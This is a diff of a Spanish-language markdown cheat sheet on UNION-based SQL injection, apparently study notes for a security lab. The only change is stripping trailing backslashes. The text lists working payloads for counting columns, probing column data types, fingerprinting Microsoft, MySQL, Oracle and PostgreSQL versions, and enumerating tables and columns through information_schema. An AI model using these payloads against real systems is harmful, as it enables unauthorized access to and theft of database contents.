@@ -28,14 +28,14 @@ pre-req: numero de columnas y data type de cada columna
 
 ### COMO SABER EL NUMERO DE COLUMNAS ?
 
-metodo_1: ' ORDER BY 1-- \
+metodo_1: ' ORDER BY 1-- 
 metodo_2: ' UNION SELECT NULL--
 
 ### COMO SABER EL DATA TYPE DE UNA COLUMNA ?
 
 > Microsoft, MySQL & PostgreSQL
 
-' UNION SELECT 'a',NULL,NULL,NULL-- \
+' UNION SELECT 'a',NULL,NULL,NULL-- 
 ' UNION SELECT NULL,'a',NULL,NULL-- | se tiene que hacer iterativo cambiando los campos para saber que tipo son.
 
 > Oracle
@@ -44,17 +44,17 @@ metodo_2: ' UNION SELECT NULL--
 
 ### IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS [TIPO/VERSION] 
 
-Microsoft >> SELECT @@version \
-MySQL >> SELECT @@version \
-Oracle >> SELECT banner FROM v$version | SELECT version FROM v$instance \
-PostgreSQL >> SELECT version() \
+Microsoft >> SELECT @@version 
+MySQL >> SELECT @@version 
+Oracle >> SELECT banner FROM v$version | SELECT version FROM v$instance 
+PostgreSQL >> SELECT version() 
 
-### LISTAR TABLAS DE LA BASE DE DATOS / [Microsoft/MySQL/PostgreSQL] \
+### LISTAR TABLAS DE LA BASE DE DATOS / [Microsoft/MySQL/PostgreSQL] 
 
-SELECT [columns] FROM information_schema.tables | '+UNION+SELECT+table_name,null+FROM+information_schema.tables-- \
-SELECT [columns] FROM information_schema.columns \
+SELECT [columns] FROM information_schema.tables | '+UNION+SELECT+table_name,null+FROM+information_schema.tables-- 
+SELECT [columns] FROM information_schema.columns 
 
-SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm' \
+SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm' 
 
 ### LISTAR TABLAS DE LA BASE DE DATOS / [Oracle] 
 
